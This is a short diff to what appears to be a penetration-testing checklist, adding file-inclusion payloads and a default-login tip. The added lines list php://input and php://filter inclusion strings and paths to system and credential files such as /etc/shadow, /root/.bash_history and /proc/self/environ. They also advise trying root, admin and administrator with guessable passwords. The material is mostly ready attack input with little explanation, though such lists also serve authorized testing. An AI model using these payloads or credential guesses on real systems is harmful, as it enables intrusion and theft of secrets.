@@ -36,6 +36,39 @@ RFI/LFI
     */var/www/html/config.php # or similar paths to get SQL etc creds*
     *?page=php://filter/convert.base64-encode/resource=../config.php*
     *../../../../../boot.ini # to find out windows version**
+    *php://input
+php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+/etc/issue
+/proc/version
+/etc/profile
+/etc/passwd
+/etc/passwd
+/etc/shadow
+/root/.bash_history
+/var/log/dmessage
+/var/mail/root
+/var/spool/cron/crontabs/root
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/self/fd/4
+/proc/self/fd/5
+/proc/self/fd/6
+/proc/self/fd/7
+/proc/self/fd/8
+/proc/self/fd/9
+/proc/self/fd/10
+/proc/self/fd/11
+/proc/self/fd/12
+/proc/self/fd/13
+/proc/self/fd/14
+/proc/self/fd/15
+...*
 
 Drupal
     *$droopescan scan -u $ip*
@@ -68,6 +101,7 @@ SSL certificates
     is the clock skewed
     Any names that could be usernames for bruteforce/guessing.
 
-
+Login
+    Always try user root, admin, administrator with password letmein admin root
 Files
     Run strings against every file
